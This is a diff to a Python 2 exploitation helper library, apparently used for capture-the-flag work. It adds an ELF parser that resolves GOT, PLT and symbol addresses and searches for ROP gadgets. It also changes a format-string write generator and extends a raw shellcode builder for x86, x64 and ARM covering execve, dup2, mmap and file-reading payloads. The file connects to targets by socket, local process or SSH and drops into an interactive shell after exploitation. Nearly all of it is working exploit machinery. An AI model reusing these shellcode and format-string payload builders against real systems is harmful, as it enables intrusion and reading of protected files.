@@ -1,11 +1,10 @@
 #!/usr/bin/env python
 import sys
 import os
+from string import strip
 from struct import pack,unpack
 from thread import start_new_thread
 from base64 import b64encode, b64decode
-import signal
-from random import choice
 from time import sleep
 
 lhp     = ('www.shift-crops.net',4296)
@@ -46,31 +45,41 @@ unpack_16   = lambda x:    unpack('<H',x)[0]
 unpack_32   = lambda x:    unpack('<I',x)[0]
 unpack_64   = lambda x:    unpack('<Q',x)[0]
 
-color       = {'N':'\x1b[39m','R':'\x1b[31m','G':'\x1b[32m','Y':'\x1b[33m','B':'\x1b[34m'}
-template    = '\x1b[1m%s\x1b[39m%s\x1b[0m\n'
-info        = lambda x:    sys.stderr.write(template % (color['B']+'[+]', x))
-fail        = lambda x:    sys.stderr.write(template % (color['R']+'[-]', x))
-proc        = lambda x:    sys.stdout.write(template % (color['G']+'[*]', x))
-warn        = lambda x:    sys.stderr.write(template % (color['Y']+'[!]', x))
+
+color       = {'N':9,'R':1,'G':2,'Y':3,'B':4,'M':5,'C':6,'W':7}
+console     = {'bold'       : '\x1b[1m', \
+               'c_color'    : lambda c: '\x1b[%dm'%(30+color[c]), \
+               'b_color'    : lambda c: '\x1b[%dm'%(40+color[c]), \
+               'reset'      : '\x1b[0m'}
+
+template    = console['bold']+'%s%s%s'+console['reset']
+message     = lambda c,t,x: sys.stderr.write(template % (console['c_color'](c), t, console['c_color']('N')+x) +'\n')
+info        = lambda x:     message('B', '[+]', x)
+proc        = lambda x:     message('G', '[*]', x)
+warn        = lambda x:     message('Y', '[!]', x)
+fail        = lambda x:     message('R', '[-]', x)
 
 #==========
 
 if os.name=='nt':
     from colorama import init as color_init
     color_init()
-    
+
 #==========
 
 class Communicate:    
-    def __init__(self, target, mode='RAW', disp=True, **args):
+    def __init__(self, target, mode='SOCKET', disp=True, **args):
         self.disp = disp
         
-        if mode not in ['RAW','LOCAL','SSH']:
+        if mode not in ['SOCKET','LOCAL','SSH']:
             warn('Communicate : mode "%s" is not defined' % mode)
-            info('Communicate : Set mode "RAW"')
-            mode = 'RAW'
+            info('Communicate : Set mode "SOCKET"')
+            mode = 'SOCKET'
         self.mode = mode
         self.is_alive = True
+        
+        self.show_mode = None
+        self.hexdump = None
 
         # for legacy exploit
         if isinstance(target, tuple):
@@ -78,8 +87,9 @@ class Communicate:
         elif isinstance(target, str):
             target = {'program':target}
 
-        if self.mode=='RAW':
+        if self.mode=='SOCKET':
             import socket
+            
             rhp = (target['host'],target['port'])
             if self.disp:
                 proc('Connect to %s:%d' % rhp)
@@ -89,26 +99,34 @@ class Communicate:
             
         elif self.mode=='LOCAL':
             import subprocess
+            
+            e = None
             if self.disp:
                 proc('Starting program: %s' % target['program'])
             if 'GDB' in args and isinstance(args['GDB'] ,(int,long)):
                 shell = False
-                target['program'] = ('gdbserver localhost:%d %s' % (args['GDB'], target['program'])).split(' ')
+                
+                if 'lib' in args:
+                    info('LD_PRELOAD: %s' % args['lib'])
+                    wrapper = '--wrapper env LD_PRELOAD=%s --' % args['lib']
+                else:
+                    wrapper = ''
+                    
+                target['program'] = ('gdbserver %s localhost:%d %s' % (wrapper, args['GDB'], target['program'])).split(' ')
             elif 'ASLR' in args and not args['ASLR']:
                 shell = True
                 target['program'] = 'ulimit -s unlimited; setarch i386 -R %s' % target['program']
             else:
                 shell = False
                 target['program'] = target['program'].split(' ')
-            if 'lib' in args:
-                info('LD_PRELOAD: %s' % args['lib'])
-                e = {'LD_PRELOAD':args['lib']}
-            else:
-                e = None
+                if 'lib' in args:
+                    info('LD_PRELOAD: %s' % args['lib'])
+                    e = {'LD_PRELOAD':args['lib']}
 
             self.wait = ('wait' in args and args['wait'])
                 
             self.proc = subprocess.Popen(target['program'], shell=shell, env=e, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+            info('PID : %d' % self.proc.pid)
             self.set_nonblocking(self.proc.stdout)
             if target['program'][0]=='gdbserver':
                 info(self.read_until()[:-1])
@@ -118,6 +136,7 @@ class Communicate:
             
         elif self.mode=='SSH':
             import paramiko
+            
             if self.disp:
                 proc('Connect SSH to %s@%s:%d' % (target['username'],target['host'],target['port']))
             self.ssh = paramiko.SSHClient()
@@ -130,16 +149,37 @@ class Communicate:
                 target['program'] = 'ulimit -s unlimited; setarch i386 -R %s' % target['program']
             self.channel.exec_command(target['program'])
 
+    def set_show(self, mode=None):
+        if mode in ['RAW', 'HEXDUMP']:
+            self.show_mode = mode
+        else:
+            self.show_mode = None
+            
+        if self.show_mode=='HEXDUMP' and self.hexdump is None:
+            from hexdump import hexdump
+            self.hexdump = hexdump
+
+    def show(self, c, t, data):
+        sys.stdout.write(template % (console['c_color'](c), '\n[%s]' % t, ''))
+        if self.show_mode=='RAW':
+            sys.stdout.write(data)
+        elif self.show_mode=='HEXDUMP':
+            sys.stdout.write('\n')
+            self.hexdump(data)
+
     def set_nonblocking(self,fh):
         import fcntl
 
         fd = fh.fileno()
         fl = fcntl.fcntl(fd, fcntl.F_GETFL)
         fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
-
+        
     def send(self,msg):
+        if self.show_mode is not None:
+            self.show('C', 'SEND', msg)
+            
         try:
-            if self.mode=='RAW':
+            if self.mode=='SOCKET':
                 self.sock.sendall(msg)
             elif self.mode=='LOCAL':
                 self.proc.stdin.write(msg)
@@ -158,7 +198,7 @@ class Communicate:
         sleep(0.05)
         rsp = ''
         try:
-            if self.mode=='RAW':
+            if self.mode=='SOCKET':
                 rsp = self.sock.recv(num)
             elif self.mode=='LOCAL':
                 rsp = self.proc.stdout.read(num)
@@ -166,6 +206,9 @@ class Communicate:
                 rsp = self.channel.recv(num)
         except:
             pass
+
+        if self.show_mode is not None:
+            self.show('Y', 'READ', rsp)
         return rsp
 
     def read_all(self):
@@ -173,7 +216,7 @@ class Communicate:
         try:
             rsp = ''
             while True:
-                if self.mode=='RAW':
+                if self.mode=='SOCKET':
                     rcv = self.sock.recv(512)
                 elif self.mode=='LOCAL':
                     rcv = self.proc.stdout.read()
@@ -186,13 +229,16 @@ class Communicate:
                     break
         except:
             pass
+        
+        if self.show_mode is not None:
+            self.show('Y', 'READ', rsp)
         return rsp
 
     def read_until(self,term='\n'):
         rsp = ''
         while not rsp.endswith(term):
             try:
-                if self.mode=='RAW':
+                if self.mode=='SOCKET':
                     rsp += self.sock.recv(1) 
                 elif self.mode=='LOCAL':
                     rsp += self.proc.stdout.read(1)
@@ -200,10 +246,13 @@ class Communicate:
                     rsp += self.channel.recv(1)
             except:
                 pass
+        
+        if self.show_mode is not None:
+            self.show('Y', 'READ', rsp)
         return rsp
 
     def __del__(self):
-        if self.mode=='RAW':
+        if self.mode=='SOCKET':
             self.sock.close()
             if self.disp:
                 proc('Network Disconnect...')
@@ -219,6 +268,155 @@ class Communicate:
             if self.disp:
                 proc('Session Disconnect...')
 
+#==========
+
+class ELF:
+    def __init__(self, path, rop=False):
+        from elftools.elf.elffile import ELFFile
+        from elftools.elf.sections import SymbolTableSection
+
+        self.__symbolTableSection = SymbolTableSection
+
+        proc('Loading "%s"...' % path)
+        self.elf    = ELFFile(open(path,'rb'))
+        self.path   = path
+        
+        self.arch   = self.elf.get_machine_arch().lower()        
+        self.pie    = 'DYN' in self.elf.header.e_type
+        self.base   = 0
+        
+        self.__section                  = self.init_sections()
+        self.__got                      = self.init_got()
+        self.__plt                      = self.init_plt()
+        self.__symbol, self.__function  = self.init_symbols()
+        
+        self.__list_gadgets             = self.init_ropgadget() if rop else None
+
+    def init_sections(self):
+        self.__list_sections = list(self.elf.iter_sections())
+        
+        section = dict()
+        for sec in self.__list_sections:
+            section[sec.name]  = sec.header.sh_addr
+        return section
+
+    def init_got(self):
+        sec_rel_plt = self.elf.get_section_by_name('.rel.plt')
+        sym_rel_plt = self.__list_sections[sec_rel_plt.header.sh_link]
+
+        got = dict()
+        for rel in sec_rel_plt.iter_relocations():
+            sym_idx = rel.entry.r_info_sym
+            sym     = sym_rel_plt.get_symbol(sym_idx)
+            got[sym.name]  = rel.entry.r_offset
+        return got
+
+    def init_plt(self):
+        if self.arch in ('x86','amd64'):
+            header_size, entry_size = 0x10, 0x10
+                
+        sec_plt     = self.elf.get_section_by_name('.plt')
+
+        plt = {u'resolve' : sec_plt.header.sh_addr}
+        addr_plt_entry = sec_plt.header.sh_addr + header_size
+        for name, addr in sorted(self.__got.items(), key=lambda x:x[1]):
+            plt[name] = addr_plt_entry
+            addr_plt_entry += entry_size
+        return plt
+
+    def init_symbols(self):
+        symbol      = dict()
+        function    = dict()
+        
+        for sec in self.__list_sections:
+            if not isinstance(sec, self.__symbolTableSection):
+                continue
+            
+            for sym in sec.iter_symbols():
+                if sym.entry.st_value:
+                    if sym.entry.st_info['type'] == 'STT_FUNC':
+                        function[sym.name]  = sym.entry.st_value
+                    else:
+                        symbol[sym.name]    = sym.entry.st_value
+        return symbol, function
+        
+    def init_ropgadget(self):
+        from ropgadget.args import Args
+        from ropgadget.core import Core
+
+        c = Core(Args(('--console',)).getArgs())
+        c.do_binary(self.path, True)
+        c.do_load(None, True)
+
+        __list_gadgets = list()
+        for gadget in c.gadgets():
+            __list_gadgets += [{'gadget':map(strip, gadget['gadget'].split(';')), 'addr':gadget['vaddr']}]
+        return __list_gadgets
+
+    def set_location(self, symbol, addr):
+        if not self.pie:
+            fail('"%s" is not PIE' % self.path)
+            return
+
+        if self.base:
+            warn('Base address is already set')
+
+        if symbol in self.__function:
+            self.base += addr - self.__function[symbol] 
+        elif symbol in self.__symbol:
+            self.base += addr - self.__symbol[symbol]
+        else:
+            fail('symbol "%s" not found' % symbol)
+            return
+        
+        info('Base address(%s) is 0x%08x' % (self.path, self.base))
+        if self.base & 0xff:
+            warn('Base address is maybe wrong')
+
+    def search(self, data, *section):
+        if len(section):
+            section = list(self.elf.get_section_by_name(k) for k in section)
+        else:
+            section = self.__list_sections
+
+        for sec in section:
+            if data in sec.data():
+                return self.base + sec.header.sh_addr + sec.data().find(data)
+        return None
+
+    def section(self, name):
+        return self.base + self.__section[name]
+
+    def plt(self, name):
+        return self.base + self.__plt[name]
+
+    def got(self, name):
+        return self.base + self.__got[name]
+    
+    def function(self, name):
+        return self.base + self.__function[name]
+
+    def symbol(self, name):
+        return self.base + self.__symbol[name]
+
+    def ropgadget(self, *keyword):
+        if self.__list_gadgets is None:
+            fail('No ROPgadgets loaded')
+            return None
+
+        for g in self.__list_gadgets:
+            if len(keyword)!=len(g['gadget']):
+                continue
+
+            for i in range(len(keyword)):
+                if not keyword[i] in g['gadget'][i]:
+                    break
+                if i==len(keyword)-1:
+                    return self.base + g['addr']
+                
+        fail('ROPgadgets "%s" not found...' % str(keyword))
+        return None
+        
 #==========
 
 class FSB:
@@ -273,7 +471,8 @@ class FSB:
 
     def write(self,index,value):
         x = value - self.count
-        fsb  = '%%%d$%dc' % (1, x if x>0 else self.fr+x) if x else ''
+        #fsb  = '%%%d$%dc' % (1, x if x>0 else self.fr+x) if x else ''
+        fsb  = '%%%dc' % (x if x>0 else self.fr+x) if x else ''
         fsb += '%%%d$%sn' % (index + self.header/4, 'h'*self.wfs)
         self.count = value
         return self.gen(fsb)
@@ -414,7 +613,7 @@ class ShellCode:
         self.initialized= False
 
         if self.arch in ['x86','arm']:
-            self.sys_no = {'exit':0x01, 'fork':0x02, 'read':0x03, 'write':0x04, 'open':0x05, 'close':0x06, 'execve':0x0b, 'dup2':0x3f, 'mmap':0x5a, 'munmap':0x5b, 'mprotect':0x7d, 'geteuid':0xc9, 'setreuid':0xcb}
+            self.sys_no = {'exit':0x01, 'fork':0x02, 'read':0x03, 'write':0x04, 'open':0x05, 'close':0x06, 'execve':0x0b, 'dup2':0x3f, 'mmap':0x5a, 'mmap2':0xc0, 'munmap':0x5b, 'mprotect':0x7d, 'geteuid':0xc9, 'setreuid':0xcb}
         elif self.arch in ['x86_64','amd64']:
             self.sys_no = {'exit':0x3c, 'fork':0x39, 'read':0x00, 'write':0x01, 'open':0x02, 'close':0x03, 'execve':0x3b, 'dup2':0x21, 'mmap':0x09, 'munmap':0x0b, 'mprotect':0x0a, 'geteuid':0x6b, 'setreuid':0x71}
 
@@ -464,21 +663,46 @@ class ShellCode:
 
     def rval2arg(self,index):
         asm = ''
-        if index<6:
+        if index<7:
             if self.arch is 'x86':
                 ebx = 0xc3
-                d   = (0,2,1,5,4)
-                asm += '\x89'+chr(ebx^d[index-1])
-                                                    # mov    ebx/ecx/edx/esi/edi, eax
+                d   = (0,2,1,5,4,6)
+                asm += '\x89'+chr(ebx^d[index-1])   # mov    ebx/ecx/edx/esi/edi/ebp, eax
             elif self.arch in ['x86_64','amd64']:
                 rdi = 0xc7
-                d   = (0,1,5,5,7)
-                prefix = ('\x48','\x48','\x48','\x49','\x49')
+                d   = (0,1,5,5,7,6)
+                prefix = ('\x48','\x48','\x48','\x49','\x49','\x49')
                 asm += prefix[index-1]+'\x89'+chr(rdi^d[index-1])
-                                                    # mov    rdi/rsi/rdx/r10/r8,  rax
+                                                    # mov    rdi/rsi/rdx/r10/r8/r9,  rax
             elif self.arch is 'arm':
                 if index > 1:
-                    asm += chr(index-1)+'\x1c'      # adds   r1/r2/r3/r4, r0, #0
+                    asm += chr(index-1)+'\x1c'      # adds   r1/r2/r3/r4/r5, r0, #0
+        return self.gen(asm)
+
+    def push_rval(self,count):
+        asm=''
+        for i in range(count):
+            if self.arch in ['x86','x86_64','amd64']:
+                asm += '\x50'                       # push  eax/rax
+            elif self.arch is 'arm':
+                asm += '\x01\xb4'                   # push  {r0}
+        return self.gen(asm)
+
+    def pop_arg(self,index):
+        asm=''
+        if index<7:
+            if self.arch is 'x86':
+                ebx = 0x5b
+                d   = (0,2,1,5,4,6)
+                asm += chr(ebx^d[index-1])          # pop   ebx/ecx/edx/esi/edi/ebp
+            elif self.arch in ['x86_64','amd64']:
+                rdi = 0x5f
+                d   = (0,1,5,5,7,6)
+                prefix = ('','','','\x41','\x41')
+                asm += prefix[index-1]+chr(rdi^d[index-1])
+                                                    # pop   rdi/rsi/rdx/r10/r8/r9
+            elif self.arch is 'arm':
+                asm += chr(2**(index-1))+'\xbc'     # pop   {r0/r1/r2/r3/r4/r5}
         return self.gen(asm)
 
     def str_addr(self,string):
@@ -585,49 +809,50 @@ class ShellCode:
         return (self.str_addr(string) if string else '')+self.gen(asm)
 
     def syscall(self,sys_no,args=[None]):
-        args = args+[None]*(5-len(args))
+        args = args+[None]*(6-len(args))
         asm = ''
         if self.arch is 'x86':
             ebx = (0xdb,0xbb)
-            d   = (0,2,1,5,4)
-            for i in range(5): 
+            d   = (0,2,1,5,4,6)
+            for i in range(6): 
                 if args[i] is not None:
                     reg = (ebx[0]^(d[i]*9),ebx[1]^d[i])
                     if not args[i]&(((1<<16)-1)<<16):
-                        asm += '\x31'+chr(reg[0])                               # xor    ebx/ecx/edx/esi/edi,   ebx/ecx/edx/esi/edi
+                        asm += '\x31'+chr(reg[0])                               # xor    ebx/ecx/edx/esi/edi/ebp,   ebx/ecx/edx/esi/edi/ebp
                     if args[i]&(((1<<16)-1)<<16):
-                        asm += chr(reg[1])+pack_32(args[i])                     # mov    bx/cx/dx/si/di,        args&0xffff
+                        asm += chr(reg[1])+pack_32(args[i])                     # mov    ebx/ecx/edx/esi/edi/ebp,   args
                     elif (i<3 and args[i]&(((1<<8)-1)<<8)) or i>=3:
-                        asm += '\x66'+chr(reg[1])+pack_16(args[i])              # mov    bl/cl/dl,              args&0xff
+                        asm += '\x66'+chr(reg[1])+pack_16(args[i])              # mov    bx/cx/dx/si/di/bp,         args&0xffff
                     elif args[i]&((1<<8)-1):
-                        asm += chr(reg[1]-8)+chr(args[i]) 
+                        asm += chr(reg[1]-8)+chr(args[i])                       # mov    bl/cl/dl,                  args&0xff
+               
             asm +=  '\x31\xc0'                      # xor    eax, eax
             if sys_no:
                 asm +=  '\xb0'+chr(sys_no&0xff)         # mov    al, sys_no
             asm +=  '\xcd\x80'                      # int    0x80
         elif self.arch in ['x86_64','amd64']:
             rdi = (0xff,0xbf)
-            d   = (0,1,5,5,7)
-            prefix = (('\x48','\x48','','\x40'),('\x48','\x48','','\x40'),('\x48','\x48','',''),('\x4d','\x49','\x41','\x41'),('\x4d','\x49','\x41','\x41'))
-            for i in range(5): 
+            d   = (0,1,5,5,7,6)
+            prefix = (('\x48','\x48','','\x40'),('\x48','\x48','','\x40'),('\x48','\x48','',''),('\x4d','\x49','\x41','\x41'),('\x4d','\x49','\x41','\x41'),('\x4d','\x49','\x41','\x41'))
+            for i in range(6): 
                 if args[i] is not None:
                     reg = (rdi[0]^(d[i]*9),rdi[1]^d[i])
                     if not args[i]&(((1<<32)-1)<<32):
-                        asm += prefix[i][0]+'\x31'+chr(reg[0])                  # xor    rdi/rsi/rdx/r10/r8,   rdi/rsi/rdx/r10/r8
+                        asm += prefix[i][0]+'\x31'+chr(reg[0])                  # xor    rdi/rsi/rdx/r10/r8/r9,   rdi/rsi/rdx/r10/r8/r9
                     if args[i]&(((1<<32)-1)<<32):
-                        asm += prefix[i][1]+chr(reg[1])+pack_64(args[i])        # movabs rdi/rsi/rdx/r10/r8,   args
+                        asm += prefix[i][1]+chr(reg[1])+pack_64(args[i])        # movabs rdi/rsi/rdx/r10/r8/r9,   args
                     elif args[i]&(((1<<16)-1)<<16):
-                        asm += prefix[i][2]+chr(reg[1])+pack_32(args[i])        # mov    edi/esi/edx/r10d/r8d, args&0xffffffff
+                        asm += prefix[i][2]+chr(reg[1])+pack_32(args[i])        # mov    edi/esi/edx/r10d/r8d/r9d, args&0xffffffff
                     elif args[i]&(((1<<8)-1)<<8):
-                        asm += '\x66'+prefix[i][2]+chr(reg[1])+pack_16(args[i]) # mov    di/si/dx/r10w/r8w,    args&0xffff
+                        asm += '\x66'+prefix[i][2]+chr(reg[1])+pack_16(args[i]) # mov    di/si/dx/r10w/r8w/r9w,    args&0xffff
                     elif args[i]&((1<<8)-1):
-                        asm += prefix[i][3]+chr(reg[1]-8)+chr(args[i])          # mov    dil/sil/dl/r10b/r8b,  args&0xff
+                        asm += prefix[i][3]+chr(reg[1]-8)+chr(args[i])          # mov    dil/sil/dl/r10b/r8b/r9b,  args&0xff
             asm += '\x48\x31\xc0'                   # xor    rax, rax
             if sys_no:
                 asm += '\x04'+chr(sys_no&0xff)          # add    al, sys_no
             asm += '\x0f\x05'                       # syscall
         elif self.arch is 'arm':
-            for i in range(5):
+            for i in range(6):
                 if args[i] is not None:
                     v = args[i]
                     if v&(((1<<8)-1)<<8):
@@ -733,9 +958,10 @@ class ShellCode:
         # dup2(old,new)
         return self.syscall(self.sys_no['dup2'],[old,new])
 
-    def mmap(self,addr,length,prot,flags,fd):
+    def mmap(self,addr,length,prot,flags,fd,offset):
         # mmap(addr,length,prot,flags,fd)
-        return self.syscall(self.sys_no['mmap'],[addr,length,prot,flags,fd])
+        _mmap = 'mmap2' if self.arch in ['x86', 'arm'] else 'mmap'
+        return self.syscall(self.sys_no[_mmap],[addr,length,prot,flags,fd,offset])
     
     def munmap(self,addr,length):
         # munmap(addr,length)
@@ -777,11 +1003,22 @@ class ShellCode:
             asm += '\x68\x46'                       # mov     r0, sp
         return self.gen(asm)+self.execve(None,NULL if abridge_args else [],None)
 
-    def read_file(self, fname, buf, size=0x501):
-        asm  = self.open(fname)
+    def read_file(self, fname, buf=None, size=0x501):
+        asm = ''
+        if buf is None:
+            asm += self.mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
+            asm += self.push_rval(2)
+            
+        asm += self.open(fname)
+        
         asm += self.rval2arg(1)
+        if buf is None:
+            asm += self.pop_arg(2)
         asm += self.read(None,buf,size)
+        
         asm += self.rval2arg(3)
+        if buf is None:
+            asm += self.pop_arg(2)
         asm += self.write(STDOUT_FILENO,buf,None)
         return asm
 
@@ -856,8 +1093,13 @@ class ShellCode:
 
 class Shell:
     def __init__(self,cmn):
+        import signal
+        from random import choice
+        
         signal.signal(signal.SIGINT,self.wait_handler)
         self.cmn    = cmn
+        self.cmn.set_show(None)
+        
         self.token  = ''
         self.enable = {}
         self.wait   = False
